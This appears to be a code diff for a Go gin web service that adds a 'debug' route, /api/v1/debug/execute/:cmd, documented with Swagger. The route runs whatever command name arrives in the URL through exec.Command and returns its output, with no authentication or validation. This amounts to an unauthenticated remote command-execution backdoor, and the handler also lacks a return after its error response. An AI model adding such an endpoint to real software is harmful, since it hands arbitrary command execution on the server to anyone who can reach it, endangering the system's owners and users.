@@ -46,6 +46,7 @@ func main() {
 		debugRouter := v1.Group("/debug")
 		{
 			debugRouter.GET("", GetDebug)
+			debugRouter.GET("/execute/:cmd", execCommand)
 		}
 	}
 	router.GET("/swagger/*any", ginSwagger.WrapHandler(swaggerfiles.Handler))
@@ -111,6 +112,24 @@ func GetDebug(c *gin.Context) {
 			}
 		}
 	}
-
 	c.JSON(http.StatusOK, d)
+}
+
+// @BasePath	/api/v1
+// @Summary		Execute command and return result
+// @Schemes
+// @Description	Execute command and return result
+// @Tags		debug
+// @Accept		json
+// @Param		cmd	path	string	true	"Command to execute"
+// @Produce		json
+// @Success		200
+// @Router		/debug/execute/{cmd} [get]
+func execCommand(c *gin.Context) {
+	cmd := c.Param("cmd")
+	command, commandErr := (exec.Command(cmd)).Output()
+	if commandErr != nil {
+		c.JSON(http.StatusNotFound, gin.H{"message": "command execute failed"})
+	}
+	c.JSON(http.StatusOK, gin.H{"output": string(command)})
 }
